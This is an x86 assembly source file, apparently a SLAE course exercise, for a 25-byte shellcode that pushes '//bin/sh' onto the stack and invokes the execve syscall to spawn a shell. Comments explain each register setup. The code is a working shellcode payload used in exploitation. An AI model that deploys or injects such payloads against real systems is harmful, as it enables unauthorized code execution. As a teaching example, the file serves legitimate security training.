; Title: Execve stack (25 bytes)
; From SLAE course
; SLAE-681

global _start

section .text

_start:
	;    ebx            ecx      edx
	; [/bin/sh][NULL][&/bin/sh][NULL]

	; 1 [NULL]
	xor eax, eax
	push eax			; push NULL on the stack, before pushing a string

	; 2 [&/bin/sh][NULL]
	; PUSH //bin/sh (8 bytes) 68732f6e 69622f2f
	push 0x68732f6e
	push 0x69622f2f

	mov ebx, esp		; ebx = //bin/sh NULL

	; 3 [NULL][&/bin/sh][NULL]
	push eax
	mov edx, esp		;  edx = NULL

	push ebx
	mov ecx, esp		; ecx = &//bin/sh

	mov al, 11		; execve syscall
	int 0x80
